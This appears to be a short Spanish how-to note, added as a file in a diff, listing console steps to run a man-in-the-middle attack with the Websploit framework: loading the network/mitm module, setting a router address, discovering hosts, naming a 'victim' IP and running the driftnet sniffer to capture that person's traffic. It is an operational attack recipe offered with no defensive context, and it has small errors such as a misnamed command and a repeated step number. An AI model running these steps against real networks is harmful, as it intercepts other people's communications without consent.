@@ -1,0 +1,13 @@
+Como usar Websploit[MITM]
+
+1. abrir terminal y escribo websploit
+2. en cado de no tenerlo descarga -> lo actualiza para que aparescan los modulos #https://github.com/websploit
+3. show modules #ver modulos
+4. use network/mitm
+5. show options #ver configuracion
+6. route -n #ver informacion de router y ip
+7. set ROUTER 192.168.2.0 #configuro informacion del routrer
+8. netdiscovery #ver las redes conectadas a mi router
+9. set TARGET 192.168.2.105 #ip de la victima
+10. set SNIFFER driftnet #herramienta a usar
+10. run #lo ejecuto
